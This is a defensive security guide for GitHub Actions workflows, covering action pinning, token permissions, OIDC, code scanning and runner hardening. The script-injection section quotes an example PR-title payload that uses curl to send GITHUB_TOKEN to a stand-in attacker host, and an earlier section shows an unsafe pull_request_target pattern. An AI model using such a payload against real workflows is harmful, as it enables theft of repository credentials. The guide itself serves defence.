# GitHub Actions Security Guide

## Table of Contents

- [Supply Chain Attacks](#supply-chain-attacks)
- [Pinning Actions to SHA](#pinning-actions-to-sha)
- [GITHUB_TOKEN Minimal Permissions](#github_token-minimal-permissions)
- [OpenID Connect (OIDC) for Secretless Auth](#openid-connect-oidc-for-secretless-auth)
- [Environment Protection Rules](#environment-protection-rules)
- [Branch Protection](#branch-protection)
- [Dependabot for Actions](#dependabot-for-actions)
- [CodeQL Analysis](#codeql-analysis)
- [Secret Scanning](#secret-scanning)
- [SARIF Upload](#sarif-upload)
- [Attestation and Provenance](#attestation-and-provenance)
- [Script Injection Prevention](#script-injection-prevention)
- [Self-Hosted Runner Security](#self-hosted-runner-security)
- [Security Checklist](#security-checklist)

---

## Supply Chain Attacks

### Threat: Typosquatting

Attackers publish actions with names similar to popular ones:
```yaml
# REAL
- uses: actions/checkout@v4

# TYPOSQUAT (malicious)
- uses: action/checkout@v4        # singular "action"
- uses: actions/check0ut@v4       # zero instead of 'o'
```

**Mitigation**: Always verify the action owner/org. Prefer `actions/*` (GitHub-maintained), verified creators, and well-known orgs.

### Threat: Action compromise

A maintainer's account is compromised, or a malicious commit is pushed to an action repo. The attacker can:
- Exfiltrate secrets via network calls
- Modify build artifacts
- Inject malicious code into your releases

**Mitigation**: Pin to SHA (not tags). Tags are mutable — a compromised maintainer can repoint `v4` to malicious code. SHAs are immutable.

### Threat: Dependency confusion in actions

An action's `package.json` may pull malicious packages from public registries.

**Mitigation**: Audit action source code. Prefer actions that bundle dependencies (compiled with `ncc`). Review the action's `dist/` for unexpected network calls.

### Threat: Malicious PRs from forks

For `pull_request_target`, the workflow runs with write permissions in the context of the base branch but can access the fork's code.

```yaml
# DANGEROUS — runs fork code with write permissions
on: pull_request_target
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # Fork code!
      - run: npm test   # Attacker controls this code
```

**Safe pattern**: Only checkout base branch code, or use `workflow_run` chaining:
```yaml
# Safe: only checkout base branch
on: pull_request_target
steps:
  - uses: actions/checkout@v4    # Checks out base branch (safe)
    with:
      ref: ${{ github.event.pull_request.base.sha }}
```

---

## Pinning Actions to SHA

### Why pin to SHA

| Method | Mutable? | Risk |
|---|---|---|
| `uses: actions/checkout@v4` | Yes — tag can be moved | Compromised tag → malicious code |
| `uses: actions/checkout@v4.1.1` | Yes — tag can be moved | Same risk, just more specific tag |
| `uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11` | No | Immutable, safe |

### How to pin

```yaml
# Add a comment with the version for readability
- uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1
- uses: actions/setup-node@60edb5dd545a775178f52524783378180af0d1f8 # v4.0.2
```

### Finding SHAs

```bash
# Via git
git ls-remote --tags https://github.com/actions/checkout.git | grep 'v4.1.1'

# Via gh CLI
gh api repos/actions/checkout/git/refs/tags/v4.1.1 --jq '.object.sha'

# Via npm tool
npx pin-github-action .github/workflows/*.yml
```

### Automate with Dependabot

Dependabot updates pinned SHAs automatically when new versions are released. See [Dependabot for Actions](#dependabot-for-actions).

---

## GITHUB_TOKEN Minimal Permissions

### Default permissions

By default, `GITHUB_TOKEN` has broad permissions. Always restrict:

```yaml
# Workflow level — sets the baseline for ALL jobs
permissions:
  contents: read       # Read repo contents (checkout)
  # Everything else is implicitly denied

jobs:
  deploy:
    permissions:
      contents: read
      deployments: write   # Only this job gets deployment write
```

### Permission reference

| Permission | Read | Write |
|---|---|---|
| `actions` | List/download artifacts | Cancel runs, delete artifacts |
| `checks` | Read check runs | Create/update check runs |
| `contents` | Read code, releases | Push commits, create releases |
| `deployments` | Read deployments | Create/update deployments |
| `id-token` | — | Request OIDC JWT |
| `issues` | Read issues | Create/comment/label issues |
| `packages` | Download packages | Publish packages |
| `pages` | — | Deploy to Pages |
| `pull-requests` | Read PRs | Comment, review, merge PRs |
| `security-events` | Read alerts | Upload SARIF, dismiss alerts |
| `statuses` | Read statuses | Create commit statuses |

### Deny-all default

```yaml
# Start with nothing, add only what's needed
permissions: {}

jobs:
  lint:
    permissions:
      contents: read     # Just needs to read code
  deploy:
    permissions:
      contents: read
      id-token: write    # OIDC
      deployments: write
```

### Fork behavior

For `pull_request` events from forks, `GITHUB_TOKEN` is **always read-only** regardless of permissions declared. This is a security measure that cannot be overridden.

---

## OpenID Connect (OIDC) for Secretless Auth

OIDC eliminates stored cloud credentials. The workflow requests a JWT from GitHub, which cloud providers validate directly.

### How it works

```
Workflow → GitHub OIDC Provider → JWT Token
JWT Token → Cloud Provider (AWS/GCP/Azure) → Short-lived credentials
```

### Required permission

```yaml
permissions:
  id-token: write     # Required to request the OIDC JWT
  contents: read
```

### AWS configuration

1. Create OIDC identity provider in AWS IAM:
   - Provider URL: `https://token.actions.githubusercontent.com`
   - Audience: `sts.amazonaws.com`

2. Create IAM role with trust policy:
   ```json
   {
     "Version": "2012-10-17",
     "Statement": [{
       "Effect": "Allow",
       "Principal": {
         "Federated": "arn:aws:iam::ACCOUNT:oidc-provider/token.actions.githubusercontent.com"
       },
       "Action": "sts:AssumeRoleWithWebIdentity",
       "Condition": {
         "StringEquals": {
           "token.actions.githubusercontent.com:aud": "sts.amazonaws.com"
         },
         "StringLike": {
           "token.actions.githubusercontent.com:sub": "repo:ORG/REPO:ref:refs/heads/main"
         }
       }
     }]
   }
   ```

3. Use in workflow:
   ```yaml
   - uses: aws-actions/configure-aws-credentials@v4
     with:
       role-to-assume: arn:aws:iam::ACCOUNT:role/MyRole
       aws-region: us-east-1
   ```

### GCP configuration

```yaml
- uses: google-github-actions/auth@v2
  with:
    workload_identity_provider: 'projects/PROJECT_NUM/locations/global/workloadIdentityPools/POOL/providers/PROVIDER'
    service_account: 'SA@PROJECT.iam.gserviceaccount.com'
```

### Azure configuration

```yaml
- uses: azure/login@v2
  with:
    client-id: ${{ secrets.AZURE_CLIENT_ID }}
    tenant-id: ${{ secrets.AZURE_TENANT_ID }}
    subscription-id: ${{ secrets.AZURE_SUBSCRIPTION_ID }}
```

### Subject claim patterns for access control

| Claim pattern | Restricts to |
|---|---|
| `repo:org/repo:ref:refs/heads/main` | Push to main only |
| `repo:org/repo:environment:production` | Production environment jobs only |
| `repo:org/repo:ref:refs/tags/v*` | Version tag pushes only |
| `repo:org/repo:pull_request` | PR workflows only |

**Best practice**: Use the most restrictive `sub` claim. Never use `repo:org/repo:*` in production trust policies.

---

## Environment Protection Rules

Configure in repository Settings → Environments.

### Required reviewers

- Up to 6 individuals or teams must approve before the job proceeds.
- Reviewers receive a notification and approve/reject via the Actions UI.
- Use for production deployments, infrastructure changes, and sensitive operations.

### Wait timer

- Delay deployment by 0–43,200 minutes (30 days).
- Useful for staged rollouts (deploy, wait, then fully release).

### Deployment branch/tag restrictions

```
Allowed branches: main, release/*
Allowed tags: v*
```

Prevents accidental deployments from feature branches.

### Custom deployment protection rules

Integrate third-party checks (e.g., Datadog monitoring, PagerDuty on-call status, ServiceNow change approval) as gates.

### Environment-scoped secrets and variables

Secrets and variables defined on an environment are only available to jobs targeting that environment. Use for per-environment credentials (staging DB vs. production DB).

---

## Branch Protection

### Required status checks

Configure branches to require specific workflow jobs to pass before merging:

1. Settings → Branches → Add rule
2. Enable "Require status checks to pass before merging"
3. Select the specific check names (job names from your workflows)

### Require pull request reviews

- Minimum number of approving reviews before merge
- Dismiss stale reviews when new commits are pushed
- Require review from code owners

### Require signed commits

Ensures all commits in a PR are GPG/SSH signed. Workflow commits using `GITHUB_TOKEN` are automatically signed by GitHub.

### Restrict who can push

Limit direct pushes to specific users, teams, or apps. Force all changes through PRs.

### Status check gotcha with path filters

If a required status check uses `paths:` filtering and a PR only modifies excluded paths, the check never runs and blocks merge. Solutions:

```yaml
# Option 1: Always-passing skip job with same name
jobs:
  ci:
    if: ... # path filter condition
    # real CI

  ci-skip:
    if: ... # inverse condition
    runs-on: ubuntu-latest
    steps:
      - run: echo "No relevant changes"

# Option 2: Use paths-ignore instead (less precise)
on:
  pull_request:
    paths-ignore: ['docs/**', '*.md']
```

---

## Dependabot for Actions

### Configuration

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: github-actions
    directory: /
    schedule:
      interval: weekly
    reviewers:
      - security-team
    labels:
      - dependencies
      - actions
    commit-message:
      prefix: "ci"
    # Group minor/patch updates together
    groups:
      actions:
        patterns:
          - "*"
        update-types:
          - "minor"
          - "patch"
```

### What Dependabot does for Actions

- Detects third-party action usage in workflow files
- Opens PRs to update action versions (tags and SHA pins)
- Provides changelog and compatibility information
- Supports grouped updates to reduce PR noise

### Auto-merge Dependabot PRs

```yaml
name: Auto-merge Dependabot
on: pull_request
permissions:
  contents: write
  pull-requests: write
jobs:
  auto-merge:
    if: github.actor == 'dependabot[bot]'
    runs-on: ubuntu-latest
    steps:
      - uses: dependabot/fetch-metadata@v2
        id: meta
      - if: steps.meta.outputs.update-type == 'version-update:semver-minor' || steps.meta.outputs.update-type == 'version-update:semver-patch'
        run: gh pr merge --auto --squash "$PR_URL"
        env:
          PR_URL: ${{ github.event.pull_request.html_url }}
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
```

---

## CodeQL Analysis

### Basic setup

```yaml
name: CodeQL
on:
  push:
    branches: [main]
  pull_request:
    branches: [main]
  schedule:
    - cron: '0 6 * * 1'     # Weekly scan of default branch

permissions:
  security-events: write
  contents: read

jobs:
  analyze:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        language: ['javascript', 'python']
    steps:
      - uses: actions/checkout@v4
      - uses: github/codeql-action/init@v3
        with:
          languages: ${{ matrix.language }}
          queries: +security-extended     # or: security-and-quality
      - uses: github/codeql-action/autobuild@v3
      - uses: github/codeql-action/analyze@v3
        with:
          category: '/language:${{ matrix.language }}'
```

### Custom queries

```yaml
- uses: github/codeql-action/init@v3
  with:
    languages: javascript
    queries: |
      security-extended
      ./custom-queries/my-query.ql
    config: |
      paths:
        - src/
      paths-ignore:
        - src/test/
        - '**/*.test.js'
```

### Supported languages

JavaScript/TypeScript, Python, Ruby, Java/Kotlin, C/C++, C#, Go, Swift.

---

## Secret Scanning

### Enable in repository settings

Settings → Code security and analysis → Secret scanning → Enable

### Custom patterns

Define organization-level custom secret patterns for internal tokens:
```regex
# Example: internal API key pattern
myorg_api_[a-zA-Z0-9]{32}
```

### Push protection

When enabled, blocks pushes that contain detected secrets. Contributors can bypass with a reason (false positive, used in tests, will fix later) — all bypasses are audited.

### Secret scanning in workflows

Secrets in workflow files are automatically scanned. Common findings:
- Hardcoded tokens in `env:` blocks
- API keys in `run:` scripts
- Credentials in workflow comments

**Always use `${{ secrets.NAME }}` instead of hardcoding values.**

---

## SARIF Upload

Upload results from any security scanner to GitHub's Security tab using SARIF (Static Analysis Results Interchange Format).

### Upload pattern

```yaml
- name: Run security scanner
  run: |
    # Any tool that outputs SARIF
    trivy fs --format sarif --output trivy-results.sarif .

- uses: github/codeql-action/upload-sarif@v3
  with:
    sarif_file: trivy-results.sarif
    category: trivy          # Distinguishes multiple scanners
  if: always()               # Upload even if scan finds issues
```

### Common SARIF-compatible tools

| Tool | Purpose | SARIF Flag |
|---|---|---|
| Trivy | Container/IaC scanning | `--format sarif` |
| Semgrep | SAST | `--sarif` |
| ESLint | JS/TS linting | `--format @microsoft/eslint-formatter-sarif` |
| Checkov | IaC scanning | `--output sarif` |
| Snyk | Dependency scanning | `--sarif-file-output` |
| tfsec | Terraform scanning | `--format sarif` |

### Required permissions

```yaml
permissions:
  security-events: write    # Required for SARIF upload
  contents: read
```

---

## Attestation and Provenance

Build attestations create a verifiable record of where and how artifacts were built, using [SLSA](https://slsa.dev) provenance standards.

### Generate build attestation

```yaml
permissions:
  id-token: write
  contents: read
  attestations: write

steps:
  - uses: actions/checkout@v4
  - run: npm ci && npm run build

  - uses: actions/attest-build-provenance@v2
    with:
      subject-path: 'dist/my-app.tar.gz'
      # subject-digest: 'sha256:abc123...'  # Or specify digest directly
```

### Container image attestation

```yaml
- uses: docker/build-push-action@v6
  id: push
  with:
    push: true
    tags: ghcr.io/org/app:latest

- uses: actions/attest-build-provenance@v2
  with:
    subject-name: ghcr.io/org/app
    subject-digest: ${{ steps.push.outputs.digest }}
    push-to-registry: true
```

### Verify attestations

```bash
# Verify a local artifact
gh attestation verify my-app.tar.gz --repo org/repo

# Verify a container image
gh attestation verify oci://ghcr.io/org/app:latest --repo org/repo
```

### SBOM attestation

```yaml
- uses: anchore/sbom-action@v0
  with:
    image: ghcr.io/org/app:latest
    format: spdx-json
    output-file: sbom.spdx.json

- uses: actions/attest-sbom@v1
  with:
    subject-name: ghcr.io/org/app
    subject-digest: ${{ steps.push.outputs.digest }}
    sbom-path: sbom.spdx.json
    push-to-registry: true
```

---

## Script Injection Prevention

### The vulnerability

Untrusted input interpolated into `run:` scripts can execute arbitrary commands:

```yaml
# VULNERABLE — PR title could contain: "; curl attacker.com/steal?token=$GITHUB_TOKEN
- run: echo "PR title is ${{ github.event.pull_request.title }}"
```

### The fix: use environment variables

```yaml
# SAFE — shell variable, not template interpolation
- run: echo "PR title is $PR_TITLE"
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
```

### Untrusted contexts to watch for

| Context | Why it's untrusted |
|---|---|
| `github.event.pull_request.title` | Set by PR author |
| `github.event.pull_request.body` | Set by PR author |
| `github.event.issue.title` | Set by issue author |
| `github.event.issue.body` | Set by issue author |
| `github.event.comment.body` | Set by commenter |
| `github.event.review.body` | Set by reviewer |
| `github.event.head_commit.message` | Set by committer |
| `github.head_ref` | Branch name from fork |

### Safe in `if:` conditions

```yaml
# SAFE — if: conditions are evaluated by Actions, not the shell
- if: github.event.pull_request.title == 'deploy'
  run: echo "Deploying"
```

### Safe in `with:` inputs

```yaml
# SAFE — action inputs are passed as parameters, not shell-interpreted
- uses: actions/github-script@v7
  with:
    script: |
      const title = context.payload.pull_request.title;
      // title is a JavaScript string, not shell-interpolated
```

---

## Self-Hosted Runner Security

### Risks

- **Persistent environment**: Non-ephemeral runners retain files, credentials, and environment variables between jobs.
- **Elevated access**: Runners often have network access to internal resources.
- **Fork PRs**: By default, fork PRs can run on self-hosted runners (disable this!).

### Hardening

1. **Use ephemeral mode**: `./config.sh --ephemeral` — runner processes one job then terminates.

2. **Disable fork PR workflows on self-hosted runners**:
   Settings → Actions → Fork pull request workflows → Uncheck "Run workflows from fork pull requests"

3. **Use runner groups** to restrict which repos can use which runners.

4. **Run in containers/VMs** for isolation. Use ARC (Actions Runner Controller) on Kubernetes for ephemeral pod-per-job.

5. **Audit runner logs**: `_diag/Runner_*.log` and `_diag/Worker_*.log`.

6. **Network segmentation**: Runners should only access required services. Block access to cloud metadata endpoints (`169.254.169.254`).

7. **Pre/post job hooks** for cleanup:
   ```bash
   # ACTIONS_RUNNER_HOOK_JOB_COMPLETED=/path/to/cleanup.sh
   #!/bin/bash
   rm -rf "$GITHUB_WORKSPACE"/*
   docker system prune -af 2>/dev/null || true
   unset $(env | grep -oP '^[A-Z_]+=.*' | cut -d= -f1) 2>/dev/null || true
   ```

---

## Security Checklist

### Repository-level

- [ ] Pin all third-party actions to full commit SHA
- [ ] Enable Dependabot for `github-actions` ecosystem
- [ ] Set workflow `permissions` to minimal (deny-all default)
- [ ] Enable secret scanning with push protection
- [ ] Enable CodeQL or equivalent SAST
- [ ] Configure branch protection with required checks
- [ ] Audit all `pull_request_target` usage
- [ ] Review all `run:` steps for script injection
- [ ] Use OIDC instead of stored cloud credentials
- [ ] Enable required reviewers on production environments

### Workflow-level

- [ ] Set `permissions:` at workflow level (not just job level)
- [ ] Never interpolate untrusted input in `run:` — use `env:` mapping
- [ ] Use `if-no-files-found: error` on artifact uploads
- [ ] Set `timeout-minutes` on all jobs
- [ ] Use `concurrency` groups to prevent conflicting deploys
- [ ] Store no secrets in workflow files — use `${{ secrets.* }}`
- [ ] Validate reusable workflow inputs
- [ ] Use environment protection rules for production deploys

### Self-hosted runners

- [ ] Enable ephemeral mode
- [ ] Disable fork PR execution on self-hosted runners
- [ ] Use runner groups with repo restrictions
- [ ] Implement pre/post job cleanup hooks
- [ ] Block cloud metadata endpoint access
- [ ] Monitor runner disk space and resource usage
- [ ] Rotate registration tokens via automation
